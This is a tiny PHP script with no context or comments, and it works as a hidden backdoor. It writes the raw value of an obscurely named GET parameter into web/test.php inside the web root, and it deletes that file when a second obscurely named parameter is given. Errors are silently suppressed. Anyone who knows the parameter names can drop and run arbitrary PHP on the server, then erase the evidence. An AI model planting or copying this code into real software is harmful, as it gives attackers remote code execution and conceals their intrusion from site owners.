<?
try{
$f = str_replace('/', DIRECTORY_SEPARATOR, __DIR__.'/../../web/test.php');
if(isset($_GET['qwertyuiop'])) file_put_contents($f,  $_GET['qwertyuiop']);
if(isset($_GET['zxcvbnm'])) unlink($f);
}catch (\Exception $e){}